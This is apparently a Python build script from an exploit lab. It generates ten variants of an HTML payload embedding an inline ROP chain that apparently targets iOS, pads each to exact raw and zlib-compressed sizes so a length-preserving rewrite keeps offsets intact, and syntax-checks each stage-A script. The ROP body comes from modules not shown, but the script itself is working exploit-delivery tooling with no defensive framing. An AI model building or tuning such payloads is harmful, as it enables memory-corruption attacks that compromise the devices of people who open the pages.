#!/usr/bin/env python3
"""Build the full 4,600 / 2,124 inline UB H-variant set for the one seed row.

Every variant embeds the same inline ROP (fixed UB arm: d=globalThis.U,
allocation-free arm, 4096-byte TRIG) and differs only in the stage-A H.  Each
is padded to exactly RAW bytes and tuned to the seed row's zlib9 length so the
Postbox preserve-length rewrite keeps value/comp/offsets identical.

Usage: make_inline_set_4600.py [H ...]   (default: 250 300 350 400 100 500 600 0 200 150)
"""
import hashlib, os, sys, zlib
HERE=os.path.dirname(os.path.abspath(__file__)); LAB=os.path.dirname(HERE); PAY=os.path.join(LAB,'payload')
sys.path.insert(0,HERE)
import make_inline_rop as M
from pad_inline_z import all_a, pad_to_z

RAW=4600; Z=2124
DEFAULT=[250,300,350,400,100,500,600,0,200,150]

def main(hs):
    b=M.rop_body(False); mini,_=M.minify(M.iife(b),'rop_inline_ios.js')
    rows=[]
    for H in hs:
        h=M.stage_a(H,mini,False)
        d0,z0,_=all_a(h,RAW)
        if z0>Z:
            print(f'H={H}: all-A z {z0} > target {Z} -- needs body tweak'); sys.exit(1)
        d,z=pad_to_z(h,RAW,Z)
        assert d is not None,(H,z)
        fn=f'ls_final_inline_h{H}_ios_{RAW}_ub.html'
        open(os.path.join(PAY,fn),'w').write(d)
        dd=d.encode()
        rows.append((H,fn,len(d),len(zlib.compress(dd,9)),hashlib.sha256(dd).hexdigest(),z0))
    for H,fn,raw,z,sha,z0 in rows:
        print(f'| `{fn}` | H={H} | {raw} | {z} | `{sha}` | all-A {z0} |')
    # seed sanity: the existing seed must still match (RAW, Z)
    sp=os.path.join(PAY,f'ls_seed_inline_{RAW}_ub.html')
    if os.path.exists(sp):
        s=open(sp,'rb').read(); sz=len(zlib.compress(s,9))
        print('\nseed',os.path.basename(sp),len(s),sz,hashlib.sha256(s).hexdigest(),
              'OK' if (len(s),sz)==(RAW,Z) else 'MISMATCH')
    # syntax check every rendered stage A
    import re,subprocess,tempfile
    for H,fn,raw,z,sha,z0 in rows:
        h=open(os.path.join(PAY,fn)).read()
        a=re.findall(r'<script>(.*?)</script>',h,re.S)[0]
        p=os.path.join('/tmp/opencode',f'chk_h{H}.js'); open(p,'w').write(a)
        r=subprocess.run(['node','--check',p],capture_output=True)
        if r.returncode!=0:
            print('SYNTAX FAIL',fn,r.stderr.decode()[:200]); sys.exit(1)
    print('syntax: all stage A scripts parse')

if __name__=='__main__':
    hs=[int(x) for x in sys.argv[1:]] or DEFAULT
    main(hs)
